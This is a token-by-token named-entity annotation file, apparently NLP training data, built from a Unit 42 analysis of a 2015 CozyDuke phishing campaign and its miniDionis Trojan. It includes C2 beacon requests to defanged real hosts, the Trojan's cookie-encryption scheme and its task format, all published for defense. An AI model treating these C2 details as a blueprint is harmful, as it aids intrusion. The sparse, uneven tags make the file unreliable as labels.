Unit O
42 O
has O
uncovered O
a O
new O
campaign O
from O
the O
CozyDuke O
threat O
actors O
, O
aka O
CozyCar O
[ O
1 O
] O
, O
leveraging O
malware O
that O
appears O
to O
be O
related O
to O
the O
Seaduke O
malware O
described O
earlier O
this O
week O
by O
Symantec O
. O
 
[ O
2 O
] O
This O
campaign O
, O
which O
began O
on O
July O
7 O
, O
2015 O
, O
appears O
to O
be O
targeted O
at O
government O
organizations O
and O
think O
- O
tanks O
located O
in O
democratic O
countries O
[ O
3 O
] O
, O
and O
utilizes B-Action
compromised O
, B-Entity
legitimate I-Entity
websites I-Entity
for B-Modifier
spear O
phishing B-Entity
and O
command O
and O
control O
activity O
. O
 
Unit O
42 O
discovered O
the O
extent O
of O
this O
attack O
using O
the O
Palo O
Alto O
Networks O
AutoFocus O
service O
, O
which O
allows O
analysts O
to O
quickly O
find O
correlations O
among O
malware O
samples O
analyzed O
by O
WildFire O
. O
 
All O
files O
referenced O
throughout O
the O
analysis O
are O
contained O
in O
the O
IOC O
table O
at O
the O
end O
of O
this O
blog O
. O
 
The O
current B-Entity
CozyCar I-Entity
campaign I-Entity
includes B-Action
spear O
phishing B-Entity
emails I-Entity
that I-Entity
deliver I-Entity
the I-Entity
payload I-Entity
from I-Entity
either I-Entity
by I-Entity
a I-Entity
link I-Entity
to I-Entity
a I-Entity
.zip I-Entity
file I-Entity
on I-Entity
a I-Entity
compromised I-Entity
website I-Entity
or I-Entity
by I-Entity
direct I-Entity
delivery I-Entity
as I-Entity
an I-Entity
attachment I-Entity
to I-Entity
the I-Entity
phish I-Entity
. O
 
At O
the O
time O
of O
our O
analysis O
, O
the O
phishing O
link O
was O
no O
longer O
active O
. O
 
When O
a O
user O
opens O
the O
attached O
file O
a O
poorly O
detected O
executable O
file O
[ O
VT O
1/54 O
] O
is O
extracted O
. O
 
The O
initial O
dropper O
is O
a O
self O
- O
extracting O
archive O
( O
SFX O
) O
. O
 
Upon O
execution O
, O
this O
executable O
file O
will O
drop O
two O
files O
in O
the O
% O
TEMP% O
directory O
: O
a O
decoy O
.wav O
file O
and O
the O
secondary O
dropper O
. O
 
The O
CozyDuke O
group O
commonly O
uses O
legitimate O
media O
files O
to O
trick O
users O
. O
 
In O
reality O
, O
while O
the O
media O
- O
a O
.wav O
file O
with O
a O
female O
voice O
claiming O
to O
be O
a O
reporter O
looking O
for O
commentary O
- O
is O
played O
, O
the O
secondary O
dropper O
executes O
in O
the O
background O
. O
 
The O
secondary O
dropper O
requests O
a O
.swf O
file O
using O
SSL O
as O
illustrated O
in O
the O
HTTP O
traffic O
below O
. O
 
As O
of O
this O
writing O
, O
the O
domain O
extranet.qualityplanning[.]com O
resolved O
to O
64.244.34[.]200 O
. O
 
GET O
/webscriptsecurity O
/ O
view/4/player.swf O
HTTP/1.1 O
Accept O
: O
text O
/ O
html O
, O
application O
/ O
xhtml+xml,*/ O
* O
Accept O
- O
Language O
: O
en_US O
User O
- O
Agent O
: O
Mozilla/5.0 O
( O
compatible O
; O
MSIE O
8.0 O
; O
Windows O
NT O
5.1 O
; O
Trident/4.0 O
; O
.NET O
CLR O
1.1.4322 O
; O
.NET O
CLR O
2.0.50727 O
) O
Host O
: O
extranet.qualityplanning[.]com O
Connection O
: O
Keep O
- O
Alive O
GET O
/webscriptsecurity O
/ O
view/4/player.swf O
HTTP/1.1 O
Accept O
: O
text O
/ O
html O
, O
application O
/ O
xhtml+xml,*/ O
* O
Accept O
- O
Language O
: O
en_US O
User O
- O
Agent O
: O
Mozilla/5.0 O
( O
compatible O
; O
MSIE O
8.0 O
; O
Windows O
NT O
5.1 O
; O
Trident/4.0 O
; O
.NET O
CLR O
1.1.4322 O
; O
.NET O
CLR O
2.0.50727 O
) O
Host O
: O
extranet.qualityplanning[.]com O
Connection O
: O
Keep O
- O
Alive O
The B-Entity
secondary I-Entity
dropper I-Entity
then O
cleans B-Action
up I-Action
after B-Modifier
itself B-Entity
with B-Modifier
a O
simple B-Entity
vbs I-Entity
script I-Entity
( O
md5:0d132ee171768dc30d14590ed2dbadd1 O
) O
that O
leaves O
only O
the O
decoy O
multimedia O
file O
behind O
. O
 
But O
what O
did O
the O
dropper O
do O
with O
the O
.swf O
file O
? O
While O
the O
player.swf O
file O
downloaded O
by O
the O
second O
stage O
dropper O
does O
contain O
media O
, O
it O
is O
, O
again O
, O
a O
decoy O
. O
 
The O
actual O
flash O
component O
of O
this O
file O
is O
roughly O
16 O
kb O
, O
leaving O
approximately O
200 O
kb O
of O
the O
file O
unaccounted O
for O
. O
 
The O
second O
stage O
dropper O
contains O
decoding O
routines O
that O
decode O
the O
arbitrary O
binary O
data O
into O
an O
executable O
file O
. O
 
The O
executable O
file O
is O
dropped O
in O
% O
appdata%/Roaming O
and O
appears O
to O
try O
and O
emulate O
legitimate O
software O
names O
: O
TimbuktuDaemon O
, O
SearchIndexer O
, O
RtkAudioService64 O
, O
dirmngr O
, O
o2flash O
, O
and O
usbrefs64 O
. O
 
This O
file O
was O
not O
observed O
on O
VirusTotal O
until O
July O
9 O
and O
has O
extremely O
low O
detection O
rates O
[ O
VT O
: O
3/54 O
] O
. O
 
It O
appears O
that O
the O
authors O
of O
this O
particular O
iteration O
of O
the O
CozyCar O
group O
's O
malware O
internally O
call O
it O
" O
miniDionis O
" O
according O
to O
pdb O
strings O
left O
in O
the O
binary O
( O
c:\BastionSolution\Shells\Projects\miniDionis4\miniDionis\obj\Release\miniDionis.pdb O
) O
. O
 
It O
also O
appears O
to O
be O
an O
iteration O
on O
the O
" O
forkmeimfamous O
" O
aka O
Seaduke O
malware O
analyzed O
by O
Unit O
42 O
in O
a O
previous O
blog O
[ O
4 O
] O
. O
 
The O
malware O
stores O
2 O
files O
in O
the O
% O
temp% O
directory O
: O
a O
configuration O
file O
and O
a O
secondary O
dll O
. O
 
The O
configuration O
file O
's O
name O
matches O
the O
final O
characters O
of O
the O
bot_id O
that O
is O
contained O
within O
as O
per O
the O
sample O
below O
. O
 
Analysis O
of O
the B-Entity
secondary I-Entity
dll I-Entity
file I-Entity
( O
name O
matches O
[ O
A O
- O
Z0 O
- O
9]{1}\.tmp O
) O
indicates O
that O
its O
primary O
function O
is O
to O
serve B-Action
as B-Modifier
a O
cleanup B-Entity
mechanism I-Entity
for I-Entity
the I-Entity
dropped I-Entity
binary I-Entity
. O
 
This O
is O
likely O
an O
attempt O
to O
thwart O
forensic O
investigations O
. O
 
Further O
examination O
of O
memory O
dumps O
taken O
following O
the O
execution O
of O
miniDionis O
reveals O
some O
clues O
into O
the O
beaconing O
activity O
exhibited O
. O
 
The O
malware O
stores O
configuration O
values O
in O
memory O
as O
key O
: O
value O
pairs O
. O
 
The O
configuration O
of O
miniDionis O
is O
a O
JSON O
blob O
with O
several O
important O
sections O
, O
which O
are O
described O
in O
the O
table O
below O
. O
 
The O
functional O
payload O
of O
this O
Trojan O
starts O
by O
creating O
a O
Mutex O
by O
splitting O
the O
" O
bot_id O
" O
value O
in O
the O
configuration O
on O
the O
hyphen O
( O
" O
- O
" O
) O
and O
using O
the O
second O
portion O
of O
the O
split O
string O
( O
specifically O
, O
" O
01MRLXW O
" O
in O
the O
case O
of O
this O
configuration O
) O
. O
 
From O
a O
functionality O
standpoint O
, O
the O
Trojan O
uses O
the O
concept O
of O
tasks O
that O
are O
processed O
and O
completed O
using O
a O
pool O
of O
threads O
. O
 
To O
obtain O
tasks O
, O
the B-Entity
Trojan I-Entity
will O
issue B-Action
an O
HTTPS B-Entity
request I-Entity
to B-Modifier
the O
C2 B-Entity
server I-Entity
( O
" O
host_scripts O
" O
in O
the O
configuration O
) O
that O
resembles O
the O
following O
example O
beacon O
. O
 
GET O
/mobile O
/ O
viewer.php O
HTTP/1.1 O
Accept O
: O
* O
/ O
* O
Accept O
- O
Language O
: O
en O
- O
US O
User O
- O
Agent O
: O
Mozilla/5.0 O
( O
Windows O
NT O
6.1 O
; O
WOW64 O
; O
Trident/7.0 O
; O
rv:11.0 O
) O
like O
Gecko O
Host O
: O
www.illuminatistudios[.]net O
Cookie O
: O
SSID O
= O
sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8 O
- O
25A O
Accept O
- O
Encoding O
: O
gzip O
, O
deflate O
Connection O
: O
Keep O
- O
Alive O
GET O
/mobile O
/ O
viewer.php O
HTTP/1.1 O
Accept O
: O
* O
/ O
* O
Accept O
- O
Language O
: O
en O
- O
US O
User O
- O
Agent O
: O
Mozilla/5.0 O
( O
Windows O
NT O
6.1 O
; O
WOW64 O
; O
Trident/7.0 O
; O
rv:11.0 O
) O
like O
Gecko O
Host O
: O
www.illuminatistudios[.]net O
Cookie O
: O
SSID O
= O
sLW5XoHJDwU3YxCRzwsEnfPPksD1sggcC8 O
- O
25A O
Accept O
- O
Encoding O
: O
gzip O
, O
deflate O
Connection O
: O
Keep O
- O
Alive O
The O
Trojan O
manually O
creates O
the O
cookie O
in O
this O
HTTP O
request O
. O
 
The O
cookie O
contains O
ciphertext O
that O
the O
Trojan O
creates O
based O
on O
the O
" O
bot_id O
" O
in O
the O
JSON O
configuration O
. O
 
The O
Trojan O
compresses O
the O
" O
bot_id O
" O
string O
using O
zlib O
and O
then O
encrypts O
it O
using O
the O
RC4 O
algorithm O
using O
a O
generated O
key O
. O
 
The O
generated O
key O
is O
a O
SHA1 O
hash O
of O
two O
randomly O
created O
strings O
: O
the O
first O
of O
which O
is O
between O
2 O
and O
8 O
bytes O
long O
and O
the O
second O
is O
between O
1 O
and O
7 O
characters O
in O
length O
. O
 
The O
ciphertext O
of O
the O
" O
bot_id O
" O
is O
then O
based64 O
encoded O
and O
finally O
the O
appended O
to O
the O
" O
cookie_name O
" O
( O
" O
SSID= O
" O
) O
in O
the O
configuration O
and O
sent O
within O
the O
HTTP O
request O
to O
the O
C2 O
server O
. O
 
Unit O
42 O
did O
not O
observe O
the O
first O
random O
string O
( O
between O
2 O
and O
8 O
characters O
in O
length O
) O
sent O
to O
the O
C2 O
in O
the O
first O
beacon O
, O
which O
would O
be O
required O
by O
the O
C2 O
to O
reproduce O
the O
exact O
SHA1 O
hash O
used O
as O
a O
key O
to O
generate O
the O
ciphertext O
in O
the O
cookie O
. O
 
Upon O
further O
examination O
we O
believe O
that O
the O
C2 O
will O
not O
be O
able O
to O
decrypt O
the O
cookie O
in O
the O
first O
beacon O
. O
 
Instead O
, O
the O
C2 O
will O
respond O
to O
the O
first O
beacon O
with O
data O
that O
the O
Trojan O
will O
use O
to O
extract O
a O
string O
, O
using O
a O
function O
named O
TrExtractKey O
seen O
in O
Figure O
2 O
, O
to O
replace O
the O
first O
random O
string O
used O
to O
generate O
the O
SHA1 O
hash O
. O
 
Once O
the O
C2 O
and O
Trojan O
have O
synchronized O
using O
this O
string O
, O
the O
C2 O
will O
be O
able O
to O
decrypt O
subsequent O
network O
beacons O
because O
the O
Trojan O
includes O
the O
random O
string O
between O
1 O
and O
7 O
characters O
that O
makes O
up O
the O
second O
half O
of O
the O
SHA1 O
hash O
within O
the O
cookie O
field O
before O
the O
ciphertext O
. O
 
The O
C2 O
communications O
, O
and O
several O
of O
the O
commands O
we O
will O
discuss O
in O
this O
blog O
, O
include O
a O
rather O
interesting O
technique O
to O
manually O
handle O
HTTP O
redirection O
, O
such O
as O
the O
HTTP O
301 O
Moved O
Permanently O
and O
HTTP O
302 O
Found O
status O
codes O
. O
 
The O
technique O
used O
to O
handle O
these O
redirections O
involves O
checking O
for O
the O
presence O
of O
a O
" O
Location O
" O
field O
within O
the O
HTTP O
headers O
of O
the O
server O
response O
, O
then O
using O
regular O
expressions O
to O
parse O
the O
HTML O
within O
server O
response O
to O
find O
the O
appropriate O
URL O
. O
 
The O
code O
contains O
three O
regular O
expressions O
to O
parse O
the O
HTML O
to O
locate O
the O
URL O
, O
the O
first O
of O
which O
is O
" O
< O
a.*?>.*?</a O
> O
" O
that O
locates O
all O
of O
the O
tags O
associated O
with O
link O
within O
the O
HTML O
. O
 
The O
second O
regular O
expression O
of O
" O
onclick=\"Accept();\ O
" O
" O
locates O
only O
links O
within O
the O
HTML O
with O
a O
specific O
" O
onclick O
" O
action O
. O
 
The O
last O
regular O
expression O
of O
" O
href\\s*=\\s*(?:[\"'](?<1>[^\"']*)[\"']|(?<1>\\S+ O
) O
) O
" O
to O
obtain O
the O
correct O
URL O
to O
interact O
with O
as O
the O
C2 O
server O
. O
 
Once O
the O
C2 O
and O
Trojan O
have O
synchronized O
and O
can O
decrypt O
their O
network O
communications O
the B-Entity
C2 I-Entity
server I-Entity
will O
begin O
responding B-Action
to B-Modifier
beacons O
from B-Entity
the I-Entity
Trojan I-Entity
with B-Modifier
JSON O
blobs B-Entity
. O
 
Unit O
42 O
has O
not O
received O
any O
JSON O
blobs O
from O
an O
active O
C2 O
server O
, O
but O
based O
on O
static O
analysis O
of O
the O
Trojan O
determined O
the O
JSON O
would O
look O
as O
follows O
. O
 
{ O
' O
tasks O
' O
: O
[ O
{ O
' O
task_id O
' O
: O
" O
" O
, O
' O
task_data O
' O
: O
{ O
' O
command O
' O
: O
" O
" O
, O
' O
data O
' O
: O
" O
" O
} O
} O
, O
] O
} O
{ O
' O
tasks O
' O
: O
[ O
{ O
' O
task_id O
' O
: O
" O
" O
, O
' O
task_data O
' O
: O
{ O
' O
command O
' O
: O
" O
" O
, O
' O
data O
' O
: O
" O
" O
} O
} O
, O
] O
} O
The O
Trojan O
takes O
this O
JSON O
blob O
and O
adds O
each O
task O
in O
the O
list O
into O
a O
pool O
for O
processing O
. O
 
Separate O
worker O
threads O
access O
this O
pool O
of O
tasks O
and O
process O
the O
commands O
and O
perform O
the O
necessary O
activities O
. O
 
Unit O
42 O
analyzed O
the O
Trojan O
's O
command O
handler O
and O
found O
several O
commands O
, O
as O
seen O
in O
Table O
2 O
, O
which O
allows B-Action
the O
threat B-Entity
actors I-Entity
to B-Modifier
carry O
out B-Entity
a I-Entity
full I-Entity
range I-Entity
of I-Entity
activities I-Entity
on I-Entity
the I-Entity
system I-Entity
. O
 
The O
actors O
behind O
the O
CozyDuke O
framework O
are O
highly O
sophisticated O
, O
motivated O
, O
and O
have O
become O
increasingly O
bold O
in O
their O
campaigns O
. O
 
We O
recommend O
that O
other O
security O
practitioners O
review O
the O
included O
Indicators O
of O
Compromise O
( O
IoCs O
) O
to O
ensure O
they O
have O
not O
been O
targets O
in O
this O
campaign O
, O
and O
add O
the O
appropriate O
security O
controls O
to O
prevent O
future O
attacks O
. O
 
This O
group O
is O
reliant O
on O
social O
engineering O
, O
and O
thus O
, O
user O
education O
remains O
of O
paramount O
importance O
. O
 
Palo O
Alto O
Networks O
customers O
using O
WildFire O
were O
protected O
from O
this O
campaign O
. O
 
All O
known O
elements O
of O
this O
campaign O
have O
been O
accurately O
identified O
by O
WildFire O
as O
malicious O
. O
 
IOCs O
Sources O
[ O
1 O
] O
https://securelist.com/blog/research/69731/the-cozyduke-apt/ O
[ O
2 O
] O
http://www.symantec.com/connect/blogs/forkmeiamfamous-seaduke-latest-weapon-duke-armory O
[ O
3 O
] O
http://www.theregister.co.uk/2015/04/22/cozyduke_hackers_white_house_state_dept_malware/ O
[ O
4 O
] O
http://researchcenter.paloaltonetworks.com/2015/07/unit-42-technical-analysis-seaduke/ O
 
